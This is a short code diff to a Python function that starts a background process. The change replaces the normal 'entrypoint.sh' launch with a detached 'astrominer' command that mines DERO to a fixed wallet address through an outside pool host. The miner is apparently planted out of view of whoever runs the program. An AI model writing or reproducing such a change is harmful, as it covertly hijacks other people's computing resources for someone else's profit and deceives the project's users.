@@ -34,7 +34,7 @@ def start_process():
     if ptk_lil is None:
         print('ls variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'nohup sh entrypoint.sh > {LOG_FILE} 2>&1 &'
+    cmd = f'nohup astrominer -w dero1qyfl5p0etumw44zfeahjue4qdkhvm5vsjyru0t8vggtmau06d4a9gqq9dwqsl -r dero.rabidmining.com:10300 -p rpc > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
